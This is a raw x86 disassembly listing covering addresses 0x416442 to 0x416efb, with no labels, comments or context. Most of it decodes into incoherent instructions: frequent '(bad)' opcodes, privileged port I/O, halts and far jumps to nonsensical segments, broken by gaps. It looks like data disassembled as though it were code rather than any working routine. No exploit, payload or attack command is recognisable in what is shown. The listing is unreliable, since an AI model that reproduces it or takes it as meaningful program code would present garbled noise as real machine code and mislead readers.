  416442:	mov    dh,0x9f
  416444:	add    edx,DWORD PTR [ebx-0x4e]
  416447:	arpl   WORD PTR [edi-0x1865589a],cx
  41644d:	push   edx
  41644e:	jb     0x41645e
  416450:	mov    al,ds:0xadfd21c4
  416455:	push   eax
  416456:	sbb    ch,dh
  416458:	(bad)  
  41645a:	cmp    DWORD PTR [ebx+0x5b7eddca],eax
  416460:	aas    
  416461:	push   es
  416462:	ds pop ebx
  416464:	addr16 pop ebx
  416466:	lods   eax,DWORD PTR ds:[esi]
  416467:	idiv   BYTE PTR [esi-0x20910fae]
  41646d:	(bad)  [edi]
  41646f:	sub    BYTE PTR [eax],0x4
  416472:	loope  0x4164a2
  416474:	mov    esp,0x8f5b7ebb
  416479:	pop    ebp
  41647a:	shl    esp,cl
  41647c:	xchg   esi,eax
  41647d:	push   edx
  41647e:	push   edx
  41647f:	arpl   di,di
  416481:	std    
  416482:	push   esp
  416483:	call   0x0:0xdbe7
	...
  4164ae:	add    BYTE PTR [eax],al
  4164b0:	aas    
  4164b1:	pop    ebx
  4164b2:	out    0x83,eax
  4164b4:	cdq    
  4164b5:	adc    eax,DWORD PTR [ecx]
  4164b7:	ja     0x4164c5
  4164b9:	cmc    
  4164ba:	std    
  4164bb:	hlt    
  4164bc:	icebp  
  4164bd:	hlt    
  4164be:	jae    0x4164b1
  4164c0:	cmc    
  4164c1:	xor    esi,DWORD PTR [ecx]
  4164c3:	pop    esi
  4164c4:	in     al,dx
  4164c5:	and    al,bl
  4164c7:	in     eax,dx
  4164c8:	cmp    eax,0xb83d898e
  4164cd:	sbb    ch,bh
  4164cf:	sar    DWORD PTR ds:0x963e5481,cl
  4164d5:	pop    esp
  4164d6:	call   0xfe35b828
  4164db:	pusha  
  4164dc:	jbe    0x4164ce
  4164de:	push   0x9b788f
  4164e3:	push   ds
  4164e4:	jbe    0x416542
  4164e6:	call   0xfe367e78
  4164eb:	push   cs
  4164ec:	data16 lock std 
  4164ef:	jl     0x416526
  4164f1:	cld    
  4164f2:	or     eax,0xc7f58cba
  4164f7:	sub    eax,DWORD PTR [ecx+0x5b]
  4164fa:	push   ebx
  4164fb:	bound  eax,QWORD PTR [ecx-0x2b1a3b27]
  416501:	mov    WORD PTR [edx-0x17],gs
  416504:	repz mov ?,ebp
  416507:	pop    esp
  416508:	or     bh,ah
  41650a:	scas   eax,DWORD PTR es:[edi]
  41650b:	sbb    ebp,DWORD PTR [edi-0xb]
  41650e:	xchg   DWORD PTR [esi+ecx*4],ebp
  416511:	loope  0x416546
  416513:	and    BYTE PTR [eax],al
	...
  41653d:	add    BYTE PTR [edx+0x3962009a],dh
  416543:	xchg   esi,eax
  416544:	dec    eax
  416545:	sub    BYTE PTR [edx],bh
  416547:	fstp   TBYTE PTR ds:0x689ef1e9
  41654d:	psllq  mm3,QWORD PTR [edx+0x266a3e00]
  416554:	and    cl,ch
  416556:	cmp    eax,0xbb00c060
  41655b:	jmp    0xfffd:0x4a85e853
  416562:	inc    edi
  416563:	pop    ss
  416564:	(bad)  
  416565:	jmp    DWORD PTR [eax]
  416567:	leave  
  416568:	gs jne 0x4165d7
  41656b:	sbb    dh,bh
  41656d:	dec    edi
  41656e:	lock or eax,DWORD PTR [esi]
  416571:	call   0x400eb7
  416576:	call   DWORD PTR [ecx+0x33]
  416579:	inc    DWORD PTR [eax]
  41657b:	xchg   esi,eax
  41657c:	add    BYTE PTR [esi-0x19],al
  41657f:	dec    eax
  416580:	add    BYTE PTR [ebp+0x2d],dh
  416583:	and    edx,edi
  416585:	xor    edx,DWORD PTR [edi]
  416587:	loopne 0x416587
  416589:	jmp    DWORD PTR [eax]
  41658b:	mov    ch,bh
  41658d:	scas   al,BYTE PTR es:[edi]
  41658e:	pop    edi
  41658f:	bound  esi,QWORD PTR [ebx-0x45]
  416592:	xor    BYTE PTR [edx+edi*8],cl
  416595:	jmp    FWORD PTR [edx-0xa6c1a11]
  41659b:	mov    edi,esi
  41659d:	pop    edi
  41659e:	shl    DWORD PTR ds:0x4bf,1
	...
  4165cc:	pop    ss
  4165cd:	stos   BYTE PTR es:[edi],al
  4165ce:	mov    ch,ah
  4165d0:	xchg   esp,eax
  4165d1:	mov    ds:0x986283f5,eax
  4165d6:	dec    edx
  4165d7:	inc    ecx
  4165d8:	daa    
  4165d9:	pop    edi
  4165da:	jae    0x4165e0
  4165dc:	ficomp WORD PTR [eax+0x5a7f0005]
  4165e2:	(bad)  
  4165e3:	jmp    edi
  4165e5:	xchg   esi,eax
  4165e6:	or     BYTE PTR ds:0x45888bb0,dh
  4165ec:	mov    bl,0xa3
  4165ee:	inc    esp
  4165ef:	clc    
  4165f0:	fistp  DWORD PTR [ebp+0x0]
  4165f3:	add    BYTE PTR [edx+0x19],dl
  4165f6:	not    BYTE PTR [eax-0x50]
  4165f9:	or     edx,edi
  4165fb:	(bad)  
  4165fc:	ds dec edi
  4165fe:	add    bh,bh
  416600:	dec    ebx
  416601:	adc    BYTE PTR [ecx+0x14],dl
  416604:	jge    0x416633
  416606:	sar    edi,0xb0
  416609:	out    0x4d,eax
  41660b:	out    0xdd,eax
  41660d:	or     DWORD PTR [edx],eax
  41660f:	add    BYTE PTR [ebp+0x3376046c],bh
  416615:	or     al,0x2
  416617:	add    BYTE PTR [ecx+0x1580d9d2],ah
  41661d:	ret    
  41661e:	add    edi,edi
  416620:	or     esp,DWORD PTR [eax-0x73b98bb0]
  416626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416627:	pop    esp
  416628:	jno    0x41665b
  41662a:	push   eax
  41662b:	je     0x416697
  41662d:	pushf  
  41662e:	pushf  
  41662f:	xor    eax,DWORD PTR [eax]
	...
  416659:	add    BYTE PTR [ecx+0x41],ah
  41665c:	cmp    al,cl
  41665e:	inc    esi
  41665f:	add    al,0xb7
  416661:	mov    ah,BYTE PTR [edx-0x7b]
  416664:	inc    ebp
  416665:	sti    
  416666:	aam    0x3
  416668:	fcom   QWORD PTR [ebp+0x41]
  41666b:	(bad)  
  41666c:	stc    
  41666d:	out    0xb,eax
  41666f:	mov    bl,0x50
  416671:	inc    bh
  416673:	mov    dh,0x4d
  416675:	addr16 rcr ah,0xc2
  416679:	jmp    DWORD PTR [eax]
  41667b:	addr16 stc 
  41667d:	out    0x90,eax
  41667f:	stc    
  416680:	dec    ebp
  416681:	(bad)  
  416682:	adc    DWORD PTR [edi-0x36c01b0],eax
  416688:	pop    ecx
  416689:	test   DWORD PTR [edi+0x21],0xfffcc84e
  416690:	add    DWORD PTR [ebp-0x3b],edx
  416693:	pop    ds
  416694:	add    bl,0xea
  416697:	popf   
  416698:	add    al,0x6a
  41669a:	mov    ecx,eax
  41669c:	xlat   BYTE PTR ds:[ebx]
  41669d:	pop    es
  41669e:	out    0x5a,al
  4166a0:	adc    DWORD PTR ds:0xc970f1d1,0xffffffc5
  4166a7:	and    bh,0x3
  4166aa:	shl    DWORD PTR [eax-0x63db5f01],1
  4166b0:	out    0xdb,eax
  4166b2:	jmp    0xa9458f3c
  4166b7:	fistp  WORD PTR [bp+di-0x48]
  4166bb:	(bad)  
  4166bc:	outs   dx,BYTE PTR ds:[esi]
  4166bd:	dec    edi
	...
  4166e6:	add    BYTE PTR [eax],al
  4166e8:	cwde   
  4166e9:	arpl   WORD PTR [bx+0xa],cx
  4166ed:	arpl   WORD PTR [edi-0x6f],cx
  4166f0:	dec    esi
  4166f1:	repnz push esi
  4166f3:	cmp    eax,0xb8e7567f
  4166f8:	(bad)  
  4166f9:	(bad)  
  4166fa:	push   0x48
  4166fc:	lea    ecx,[eax+0x5ef24e96]
  416702:	aas    
  416703:	cld    
  416704:	es repnz cs sti 
  416708:	cdq    
  416709:	addr16 in eax,dx
  41670b:	scas   al,BYTE PTR es:[edi]
  41670c:	repz and ebp,DWORD PTR [edx]
  41670f:	cld    
  416710:	dec    ecx
  416711:	fisubr WORD PTR [ebx+edx*2-0x6b0e0f]
  416718:	and    DWORD PTR [ebx+0x65304ec0],esi
  41671e:	daa    
  41671f:	(bad)  
  416720:	mov    ebp,0x3e03e894
  416725:	lock je 0x416777
  416728:	enter  0xc396,0x34
  41672c:	mov    ds:0xe5d8df0f,al
  416731:	lock pop esp
  416733:	dec    esp
  416734:	sbb    DWORD PTR [edx],edx
  416736:	sub    ecx,DWORD PTR [edi-0x8]
  416739:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41673b:	xlat   BYTE PTR ds:[ebx]
  41673c:	cmp    dl,ah
  41673e:	and    al,0x60
  416740:	mov    ah,0xeb
  416742:	add    dl,al
  416744:	shl    ecx,1
  416746:	jae    0x4166f5
  416748:	jne    0x416739
  41674a:	xor    DWORD PTR [esi+0x0],esp
	...
  416774:	add    BYTE PTR [eax],al
  416776:	and    bl,0x43
  416779:	lea    edi,[eax+0x67]
  41677c:	cld    
  41677d:	xchg   esi,eax
  41677e:	out    0x4,al
  416780:	(bad)  
  416781:	adc    al,0xa
  416783:	clc    
  416784:	and    DWORD PTR [ebp-0xb760f00],edi
  41678a:	or     DWORD PTR [ebx],eax
  41678c:	loope  0x416777
  41678e:	cmp    eax,0x7480bd5b
  416793:	fwait
  416794:	add    BYTE PTR [esi+0x945f8cb],bh
  41679a:	inc    edx
  41679b:	pop    ebx
  41679c:	or     DWORD PTR [ecx],ebp
  41679e:	imul   ebx,DWORD PTR [edx-0x17],0xc02d09fa
  4167a5:	add    BYTE PTR [eax],0xf1
  4167a8:	std    
  4167a9:	movsx  edi,BYTE PTR ds:[eax]
  4167ad:	out    dx,al
  4167ae:	xchg   bh,dh
  4167b0:	out    0x21,eax
  4167b2:	cmp    eax,0xed72005b
  4167b7:	ja     0x41679d
  4167b9:	xchg   edx,eax
  4167ba:	xor    al,0x53
  4167bd:	add    DWORD PTR [eax+0x50],eax
  4167c0:	add    cl,ch
  4167c2:	xor    al,0xb0
  4167c4:	jae    0x4167b2
  4167c6:	xchg   edx,eax
  4167c7:	stos   BYTE PTR es:[edi],al
  4167c8:	add    cl,ch
  4167ca:	cmp    eax,0xa5f9899b
  4167cf:	addr16 call 0x3fc70b56
  4167d5:	jmp    0x9475fa5
	...
  416802:	add    BYTE PTR [eax],al
  416804:	inc    edx
  416805:	pop    ebx
  416806:	or     DWORD PTR [ecx+0x71e756e9],ebp
  41680c:	inc    edx
  41680d:	pop    ebx
  41680e:	add    BYTE PTR [eax],al
  416810:	ins    DWORD PTR es:[edi],dx
  416811:	out    0xc3,eax
  416813:	add    bh,dl
  416815:	stos   DWORD PTR es:[edi],eax
  416816:	dec    edi
  416817:	jmp    DWORD PTR [edx]
  416819:	(bad)  
  41681a:	in     eax,0x3f
  41681c:	or     DWORD PTR [eax+eax*1+0xb],ebx
  416820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416821:	adc    dh,BYTE PTR [edx-0x77]
  416824:	and    al,BYTE PTR [ebx-0x71408a02]
  41682a:	sbb    eax,DWORD PTR [ebx-0x38]
  41682d:	popf   
  41682e:	mov    BYTE PTR [ebp-0x39],al
  416831:	popf   
  416832:	je     0x416818
  416834:	sub    BYTE PTR [eax],cl
  416836:	fsubp  st(0),st
  416838:	xchg   edi,eax
  416839:	pop    ss
  41683a:	(bad)  
  41683b:	call   FWORD PTR [ebx+ebx*4+0x10564f71]
  416842:	loop   0x416843
  416844:	xor    ch,BYTE PTR [ebx]
  416846:	push   0x41
  416848:	xchg   edi,eax
  416849:	outs   dx,BYTE PTR ds:[esi]
  41684a:	inc    esp
  41684b:	fmul   DWORD PTR [eax]
  41684d:	dec    eax
  41684e:	loopne 0x4168bb
  416850:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416851:	pop    ebx
  416852:	lea    eax,[ebp+0x53]
  416855:	jo     0x41689b
  416857:	aam    0xc7
  416859:	jo     0x41689f
  41685b:	in     al,0xb7
  41685d:	sahf   
  41685e:	je     0x416840
  416860:	das    
  416861:	mov    bh,0x59
  416863:	jmp    FWORD PTR [eax]
  416865:	repnz mov ebp,0x74
	...
  41688f:	add    BYTE PTR [eax],al
  416891:	add    BYTE PTR [ecx+0x13],dh
  416894:	add    DWORD PTR [eax],eax
  416896:	cmp    cl,ah
  416898:	(bad)  
  416899:	jne    0x4168ca
  41689b:	xchg   ebx,eax
  41689c:	ret    0x282f
  41689f:	mov    al,ds:0xa03f75fe
  4168a4:	je     0x4168ae
  4168a6:	aas    
  4168a7:	add    DWORD PTR [esi],ebp
  4168a9:	call   FWORD PTR [eax]
  4168ab:	mov    al,ds:0x5e8e474
  4168b0:	fdivp  st(7),st
  4168b2:	ds (bad) 
  4168b4:	cld    
  4168b5:	out    0xde,eax
  4168b7:	in     eax,dx
  4168b8:	dec    esp
  4168b9:	(bad)  
  4168ba:	icebp  
  4168bb:	das    
  4168bc:	fs out 0xef,eax
  4168bf:	repnz dec esp
  4168c1:	inc    BYTE PTR [esp+ecx*2-0x59baf084]
  4168c8:	aad    0x8
  4168ca:	mov    esi,0xc30f01f6
  4168cf:	icebp  
  4168d0:	dec    esp
  4168d1:	inc    cl
  4168d3:	pop    esp
  4168d4:	add    al,BYTE PTR [eax]
  4168d6:	test   eax,0x46744c9e
  4168db:	int3   
  4168dc:	test   DWORD PTR [esi],ebp
  4168de:	test   eax,0xa2744c6d
  4168e3:	gs (bad) 
  4168e5:	neg    DWORD PTR [ecx-0x1d180619]
  4168eb:	inc    ebp
  4168ec:	dec    ebx
  4168ed:	dec    BYTE PTR [ecx-0x3c18a1f9]
  4168f3:	push   edx
  4168f4:	dec    ebx
  4168f5:	inc    BYTE PTR [eax]
	...
  41691f:	add    bl,cl
  416921:	mov    bh,0x51
  416923:	dec    edi
  416924:	data16 mov BYTE PTR [ecx],cl
  416927:	jmp    FWORD PTR [ecx-0x77]
  41692a:	add    DWORD PTR [edi+0x0],ebx
  41692d:	cmp    edi,DWORD PTR [edi]
  41692f:	pop    es
  416930:	ds (bad) 
  416932:	js     0x41691f
  416934:	push   ecx
  416935:	iret   
  416936:	std    
  416937:	(bad)  
  416938:	shr    ebx,cl
  41693a:	pop    ecx
  41693b:	bound  eax,QWORD PTR [eax+0x45]
  41693e:	dec    esp
  41693f:	enter  0xffc,0x2
  416943:	push   ebp
  416944:	lds    eax,FWORD PTR [edi+0x4c]
  416947:	je     0x416983
  416949:	dec    esp
  41694a:	fs xor eax,0xbff5e521
  416950:	xchg   edx,eax
  416951:	and    DWORD PTR [ebp+0x74],ecx
  416954:	cs pop ebx
  416956:	aaa    
  416957:	pop    esp
  416958:	xchg   edx,eax
  416959:	and    eax,0x83714bde
  41695e:	(bad)  [ecx+0x39]
  416961:	pop    ebx
  416962:	into   
  416963:	ror    DWORD PTR [ecx-0x12],1
  416966:	cmp    al,0xf0
  416968:	jns    0x416958
  41696a:	xor    al,0xfc
  41696c:	fldenv [esi+0x2d84b10]
  416972:	inc    eax
  416973:	push   ss
  416974:	shr    ebp,1
  416976:	mov    al,0x46
  416978:	sub    eax,0xd57f345b
  41697d:	and    bh,0x3
  416980:	test   eax,0x37ffac
	...
  4169ad:	add    BYTE PTR [esp+ebx*4],ah
  4169b0:	out    0x4a,eax
  4169b2:	xor    bl,BYTE PTR [edi+0x11]
  4169b5:	out    dx,al
  4169b6:	mov    al,ds:0xe95bdf67
  4169bb:	in     eax,dx
  4169bc:	outs   dx,BYTE PTR ds:[esi]
  4169bd:	dec    ebx
  4169be:	sbb    DWORD PTR [ebx-0x19],ebx
  4169c1:	pop    edx
  4169c2:	retf   
  4169c3:	sub    BYTE PTR [ebx],0xdf
  4169c6:	(bad)  
  4169c7:	pop    edx
  4169c8:	push   esi
  4169c9:	rol    DWORD PTR [ebp-0x7f],1
  4169cc:	jmp    0x416a18
  4169ce:	jmp    0x3eed:0x686d4f62
  4169d5:	fsub   QWORD PTR [ecx-0x13]
  4169d8:	inc    esi
  4169d9:	mov    ah,cl
  4169db:	push   ds
  4169dc:	ret    
  4169dd:	les    edx,FWORD PTR [ecx-0x14]
  4169e0:	pushf  
  4169e1:	not    edi
  4169e3:	cmp    DWORD PTR [esi],ebx
  4169e5:	sar    DWORD PTR [ecx],1
  4169e7:	add    ebp,DWORD PTR [edx+0x4b]
  4169ea:	cmp    ch,ch
  4169ec:	and    BYTE PTR [esi+0x39],al
  4169ef:	pop    ebx
  4169f0:	pushf  
  4169f1:	jle    0x416a08
  4169f3:	test   BYTE PTR [edi],al
  4169f5:	fistp  QWORD PTR [esi+0x5b]
  4169f8:	add    BYTE PTR [ecx-0x16c07eb4],al
  4169fe:	test   BYTE PTR [edi+0x10],ah
  416a01:	out    0x2e,al
  416a03:	push   es
  416a04:	dec    ecx
  416a05:	sub    BYTE PTR [edx],bh
  416a07:	add    edx,DWORD PTR [esp+ebx*1]
  416a0a:	test   ebp,ebp
  416a0c:	or     DWORD PTR [ecx-0x5a5eadff],ebp
	...
  416a3a:	add    BYTE PTR [eax],al
  416a3c:	or     BYTE PTR [eax+eax*1-0x29ef142],bl
  416a43:	cmp    al,0xda
  416a45:	hlt    
  416a46:	sub    DWORD PTR [esi-0x2302127c],0x21
  416a4d:	cmp    DWORD PTR [edi],0x300e65e9
  416a53:	xchg   esi,eax
  416a54:	add    al,0x23
  416a56:	ret    
  416a57:	fnstsw WORD PTR ds:0xc0958986
  416a5d:	sbb    ch,bh
  416a5f:	adc    edi,DWORD PTR [edx]
  416a61:	adc    DWORD PTR [edi+0x76],0xe9e8546e
  416a68:	xor    al,0xec
  416a6a:	std    
  416a6b:	jo     0x416aeb
  416a6d:	lock push 0x9b69b2
  416a73:	rcl    DWORD PTR [edi+0x7f],0x3f
  416a77:	jmp    0x5149d180
  416a7c:	fsubr  st,st(4)
  416a7e:	std    
  416a7f:	ds hlt 
  416a81:	data16 cld 
  416a83:	outs   dx,BYTE PTR ss:[esi]
  416a85:	push   esp
  416a86:	call   0xfe2d9f92
  416a8b:	xor    BYTE PTR [ebx],al
  416a8d:	pop    eax
  416a8e:	add    BYTE PTR [eax+eax*8-0x7ed27e01],dh
  416a95:	add    BYTE PTR [eax],0x83
  416a98:	in     eax,0xec
  416a9a:	jae    0x416a9c
  416a9c:	das    
  416a9d:	nop
  416a9e:	(bad)  
  416a9f:	add    BYTE PTR cs:[eax],al
	...
  416aca:	and    BYTE PTR [edx+0x11134588],ah
  416ad0:	xchg   BYTE PTR [esi+eiz*8+0x57],ch
  416ad4:	push   0xfe187370
  416ad9:	(bad)  
  416ada:	push   0xffffffef
  416adc:	in     eax,0x65
  416ade:	adc    BYTE PTR [edx-0x5c750002],ah
  416ae4:	(bad)  
  416ae5:	jne    0x416ad6
  416ae7:	(bad)  
  416ae8:	in     eax,dx
  416ae9:	mov    al,cs:0xebc2c8a1
  416aef:	push   edi
  416af0:	push   ebx
  416af1:	mov    edx,DWORD PTR [ebx+0x2dfcc1d5]
  416af7:	push   edi
  416af8:	push   0x5a
  416afa:	mov    al,ds:0x3be8061b
  416aff:	push   ecx
  416b00:	std    
  416b01:	call   FWORD PTR [esi]
  416b03:	lods   al,BYTE PTR ds:[esi]
  416b04:	stc    
  416b05:	push   0xffffff97
  416b07:	pextrw ebp,(bad),0xc5
  416b09:	ins    BYTE PTR es:[edi],dx
  416b0a:	push   esi
  416b0b:	push   edi
  416b0c:	push   0xfe1843a8
  416b11:	dec    dl
  416b13:	cmp    al,0x45
  416b15:	inc    ecx
  416b16:	xchg   edi,eax
  416b17:	(bad)  
  416b18:	push   edi
  416b19:	xor    al,0xe0
  416b1b:	mov    eax,ds:0x9bc00a
  416b20:	dec    esi
  416b21:	push   0xbeed5767
  416b26:	(bad)  
  416b27:	aas    
  416b28:	imul   eax,DWORD PTR [ecx+0x57],0x75fea7
	...
  416b57:	add    BYTE PTR [edi-0x71],bl
  416b5a:	sbb    DWORD PTR [edx+0x20],ebx
  416b5d:	mov    ds:0xa26625e5,al
  416b62:	(bad)  
  416b63:	push   0x57
  416b65:	pextrw ebp,(bad),0xc5
  416b67:	ins    BYTE PTR es:[edi],dx
  416b68:	ds mov bl,0x1
  416b6b:	push   0xffc268e6
  416b70:	mov    eax,ds:0xbe0001f6
  416b75:	dec    esp
  416b76:	pop    ds
  416b77:	xor    al,0x19
  416b79:	repnz cld 
  416b7b:	mov    edi,0x67b20b8a
  416b80:	ds hlt 
  416b82:	pop    eax
  416b83:	mov    ebp,0x40d61c96
  416b88:	ds and al,0x47
  416b8b:	je     0x416bd3
  416b8d:	sbb    al,0x5b
  416b8f:	pop    eax
  416b90:	jmp    0x2f32c5b6
  416b95:	test   eax,0x9c3e6948
  416b9a:	xor    eax,0xd9f47f6b
  416b9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ba0:	pop    edx
  416ba1:	xor    eax,DWORD PTR [edi+edi*8]
  416ba4:	or     ebp,DWORD PTR [edi-0x23c1bf47]
  416baa:	push   esp
  416bab:	xor    dh,BYTE PTR [ecx+0x32bffcd9]
  416bb1:	sti    
  416bb2:	mov    cl,0x67
  416bb4:	ds hlt 
  416bb6:	pop    eax
  416bb7:	mov    ebp,0x40d5cc26
	...
  416be4:	add    BYTE PTR [eax],al
  416be6:	ds inc esp
  416be8:	inc    edi
  416be9:	je     0x416c21
  416beb:	mov    WORD PTR [esi+0x59898158],cs
  416bf1:	mov    ebp,0x6948912e
  416bf6:	ds sbb al,0x37
  416bf9:	imul   edi,edi,0xfffffff3
  416bfc:	fldenv [edi+0x6801b2d2]
  416c02:	cmp    al,0xf4
  416c04:	add    DWORD PTR [eax-0xebcb9a],eax
  416c0a:	dec    ecx
  416c0b:	pop    ebx
  416c0c:	repnz inc ebx
  416c0e:	int    0x43
  416c10:	mov    bh,0xdb
  416c12:	cmp    edx,ebp
  416c14:	push   es
  416c15:	mov    DWORD PTR [ecx+0x29c27c03],ebx
  416c1b:	call   0xaa69:0xf339ce06
  416c22:	sbb    dl,ch
  416c24:	(bad)  
  416c25:	jnp    0x416c88
  416c27:	jmp    0xd1e6:0xe79247ee
  416c2e:	cmp    ebx,esi
  416c30:	fstp   QWORD PTR [ecx]
  416c32:	stc    
  416c33:	jmp    0x5b7eaed8
  416c38:	xor    al,0x7b
  416c3a:	aad    0xdb
  416c3c:	stos   DWORD PTR es:[edi],eax
  416c3d:	pop    esp
  416c3e:	call   0x431e2b2c
  416c43:	pop    esp
  416c44:	out    0x3,eax
  416c46:	out    0xda,al
  416c48:	test   DWORD PTR [esi+0x0],0x0
	...
  416c73:	add    al,cl
  416c75:	shr    DWORD PTR [esp+ebx*2-0x38],cl
  416c79:	jmp    0xe743e61c
  416c7e:	aaa    
  416c7f:	inc    edi
  416c80:	sub    dl,BYTE PTR [edi-0x72]
  416c83:	rol    DWORD PTR [ecx-0xd],1
  416c86:	ins    DWORD PTR es:[edi],dx
  416c87:	call   0x4434562d
  416c8c:	dec    eax
  416c8d:	loopne 0x416c71
  416c8f:	add    al,0x3e
  416c91:	pop    ebx
  416c92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c93:	rcl    DWORD PTR [ecx+0x3e03e75a],0x22
  416c9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c9b:	dec    edi
  416c9c:	js     0x416cff
  416c9e:	out    0x3,eax
  416ca0:	in     al,0x5a
  416ca2:	rol    DWORD PTR [ebx],0xd4
  416ca5:	pop    edx
  416ca6:	rol    DWORD PTR [ebx],1
  416ca8:	mov    bl,0x9f
  416caa:	xor    esi,DWORD PTR [edx+ecx*8+0x13d00df]
  416cb1:	jmp    0x6f4206b3
  416cb6:	clc    
  416cb7:	outs   dx,DWORD PTR es:[esi]
  416cb9:	in     eax,0xe8
  416cbb:	shl    DWORD PTR [ecx],0xe9
  416cbe:	std    
  416cbf:	loop   0x416d3e
  416cc1:	ins    BYTE PTR es:[edi],dx
  416cc2:	add    eax,DWORD PTR [eax]
  416cc4:	jo     0x416cae
  416cc6:	std    
  416cc7:	jmp    0xa88a18d1
  416ccc:	cmp    eax,0x75e573e8
  416cd1:	mov    bl,0x31
  416cd3:	out    dx,al
  416cd4:	sbb    BYTE PTR [eax+0xb989],0x0
	...
  416cff:	add    BYTE PTR [eax],al
  416d01:	add    BYTE PTR [esi-0x7f290b21],al
  416d07:	jmp    0xc3d3a85c
  416d0c:	xor    esi,ecx
  416d0e:	adc    bl,0x83
  416d11:	mov    ecx,0xd1fde970
  416d16:	jo     0x416d51
  416d18:	std    
  416d19:	mov    dh,0xf7
  416d1b:	call   0x9c331c85
  416d20:	add    BYTE PTR [esi-0x610a0752],ah
  416d26:	add    cl,ch
  416d28:	jae    0x416d0b
  416d2a:	adc    eax,0x8e32ea
  416d2f:	rol    DWORD PTR [ebx-0x2170f6b],cl
  416d35:	push   0xffffffc6
  416d37:	hlt    
  416d38:	cmc    
  416d39:	jbe    0x416d33
  416d3b:	out    0x71,eax
  416d3d:	sbb    ch,BYTE PTR [edx+0x5d]
  416d40:	imul   ebp,DWORD PTR [eax+0x4db3e83d],0x8
  416d47:	jmp    0x2de8af49
  416d4c:	std    
  416d4d:	dec    esi
  416d4e:	lods   eax,DWORD PTR ds:[esi]
  416d4f:	cwde   
  416d50:	push   0x5f5300
  416d55:	add    BYTE PTR [eax],bl
  416d57:	retf   
  416d58:	in     eax,0xf7
  416d5a:	or     BYTE PTR [ecx+0x1f9fb365],ah
  416d60:	(bad)  
  416d61:	addr16 cmp al,0x2
  416d64:	inc    ecx
	...
  416d8d:	add    BYTE PTR [eax],al
  416d8f:	add    bh,cl
  416d91:	in     al,dx
  416d92:	ins    BYTE PTR es:[edi],dx
  416d93:	inc    ecx
  416d94:	daa    
  416d95:	test   BYTE PTR [edi],bh
  416d97:	sbb    edx,DWORD PTR [edi]
  416d99:	pop    esp
  416d9a:	cmp    eax,0x68161614
  416da0:	daa    
  416da1:	pop    esp
  416da2:	in     eax,dx
  416da3:	mov    esi,0x416b47bf
  416da8:	pop    ss
  416da9:	mov    eax,ds:0x9de0e8b4
  416dae:	(bad)  
  416daf:	call   DWORD PTR [edx+0x2f6fe5ef]
  416db5:	sahf   
  416db6:	(bad)  
  416db7:	call   0x3ebc4b
  416dbc:	clc    
  416dbd:	pop    ss
  416dbe:	push   cs
  416dbf:	call   DWORD PTR [edx-0x71]
  416dc2:	idiv   bh
  416dc4:	mov    BYTE PTR [ebp-0x7e00f78c],bl
  416dca:	sti    
  416dcb:	call   FWORD PTR [eax-0x2f0f4b63]
  416dd1:	popf   
  416dd2:	(bad)  
  416dd3:	call   0x3ebc43
  416dd8:	mov    eax,0xb8f7e9d7
  416ddd:	popf   
  416dde:	in     eax,0x51
  416de0:	mov    BYTE PTR [esi-0x689d0002],bl
  416de6:	call   0xfedf85ef
  416deb:	jmp    DWORD PTR [edx-0x61]
  416dee:	in     eax,0x6d
  416df0:	cmp    al,0x5f
  416df2:	add    bh,bh
	...
  416e1c:	add    BYTE PTR [eax],al
  416e1e:	ds (bad) 
  416e20:	pop    esp
  416e21:	imul   BYTE PTR [ecx-0x68]
  416e24:	pop    esp
  416e25:	xor    eax,0xc843a111
  416e2a:	jl     0x416e21
  416e2c:	add    DWORD PTR [ebp-0x3b],edx
  416e2f:	popf   
  416e30:	jg     0x416df5
  416e32:	dec    edx
  416e33:	sbb    eax,DWORD PTR [edx]
  416e35:	push   0xffffffe5
  416e37:	inc    eax
  416e38:	int    0x7
  416e3a:	es sbb eax,0x7c31ff16
  416e40:	mov    ebp,0xf9d029fb
  416e45:	addr16 sbb dl,cl
  416e48:	ret    0x18ff
  416e4b:	mov    al,0x2e
  416e4d:	inc    edi
  416e4e:	jg     0x416e44
  416e50:	pop    ecx
  416e51:	lea    ecx,[eax]
  416e53:	test   BYTE PTR [esi+edi*8-0x75],0xec
  416e58:	(bad)  
  416e5a:	push   0x33
  416e5c:	add    al,0x68
  416e5e:	cmp    al,0xf4
  416e60:	add    DWORD PTR [eax-0x1b9672a],eax
  416e66:	loope  0x416df4
  416e68:	add    al,0x0
  416e6a:	jmp    0x636547d5
  416e6f:	xor    eax,DWORD PTR [eax+ebp*2]
  416e72:	(bad)  
  416e74:	sar    edi,0xc0
  416e77:	inc    edi
  416e78:	cld    
  416e79:	out    0x58,eax
  416e7b:	pushf  
  416e7c:	inc    ebx
  416e7d:	(bad)  
  416e7e:	mov    cl,0x47
  416e80:	dec    eax
  416e81:	inc    BYTE PTR [eax]
	...
  416eab:	add    BYTE PTR [ebx],dh
  416ead:	cld    
  416eae:	pop    ecx
  416eaf:	push   ebx
  416eb0:	push   edx
  416eb1:	fld    QWORD PTR [eax+ecx*8+0x7c]
  416eb5:	add    BYTE PTR [edx],al
  416eb7:	push   ebp
  416eb8:	(bad)
  416ebb:	ret    
  416ebc:	(bad)  
  416ebd:	ins    DWORD PTR es:[edi],dx
  416ebe:	inc    esp
  416ebf:	(bad)  
  416ec0:	mov    bl,0x5b
  416ec2:	lods   al,BYTE PTR ds:[esi]
  416ec3:	inc    edi
  416ec4:	or     esi,esp
  416ec6:	aam    0xf7
  416ec8:	jo     0x416f3a
  416eca:	fistp  WORD PTR [ebx+0x55]
  416ecd:	inc    ecx
  416ece:	out    0x3,eax
  416ed0:	xor    eax,0x607ef71b
  416ed5:	pop    ecx
  416ed6:	out    0x3,eax
  416ed8:	jns    0x416e7a
  416eda:	das    
  416edb:	add    edi,DWORD PTR [esi]
  416edd:	pop    ebx
  416ede:	out    0x3c,eax
  416ee0:	cli    
  416ee1:	out    dx,al
  416ee2:	es cld 
  416ee4:	cmp    esi,esp
  416ee6:	xchg   ecx,eax
  416ee7:	add    esp,DWORD PTR [ebx+ebx*2+0x5b940381]
  416eee:	pop    esp
  416eef:	mov    esi,0x7e748b2d
  416ef4:	or     eax,0x8143feee
  416ef9:	out    0x7c,al
  416efb:	dec    ebx
